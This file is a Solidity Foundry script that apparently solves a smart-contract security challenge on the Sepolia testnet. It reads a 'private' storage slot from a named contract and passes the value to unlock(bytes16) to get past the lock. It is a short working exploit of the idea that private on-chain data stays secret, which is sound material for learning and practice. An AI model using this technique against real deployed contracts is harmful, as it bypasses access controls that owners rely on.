// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "forge-std/console.sol";

// address contract on sepolia: 0x03F5BEa2188D44165C7B875F7Ff8cf99eEdF57F5

contract unlock is Script {
    // first get the 5 slot : 32 bytes by : cast storage <address> 5 --rpc-url <url>
    //seconde return it to bytes16;
    // third passis as argument ;
    address contra = 0x03F5BEa2188D44165C7B875F7Ff8cf99eEdF57F5;
    uint s = 5;

    function run() public {
        vm.startBroadcast();
        bytes32 slot = vm.load(contra, bytes32(s));
        (bool ok, ) = contra.call(
            abi.encodeWithSignature("unlock(bytes16)", bytes16(slot))
        );
        require(ok, "tx failed");
        vm.stopBroadcast();
    }
}
